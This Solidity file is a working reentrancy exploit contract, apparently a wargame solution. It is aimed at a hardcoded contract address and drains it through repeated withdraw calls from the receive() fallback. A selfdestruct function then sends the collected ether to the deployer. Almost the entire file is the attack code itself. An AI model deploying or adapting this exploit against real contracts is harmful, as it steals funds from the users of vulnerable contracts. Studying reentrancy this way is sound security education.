// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentracy {
    function donate(address _to) external payable;

    function withdraw(uint256 _amount) external;
}

contract Reentrancy {
    IReentracy hackedContract =
        IReentracy(0x057DF98db0d86b1244F1A4782Cd5f93c72E98466);
    uint256 targetValue = 0.001 ether;
    address payable public owner;

    constructor() {
        owner = payable(msg.sender);
    }

    function hack() external payable {
        // insert msg value to donate an amount
        hackedContract.donate{value: msg.value}(address(this));
        hackedContract.withdraw(msg.value);
    }

    receive() external payable {
        uint256 hackedContractBalance = address(hackedContract).balance;
        if (hackedContractBalance >= targetValue) {
            hackedContract.withdraw(targetValue);
        }
    }

    function kill() external payable {
        require(owner == msg.sender);
        selfdestruct(owner);
    }
}
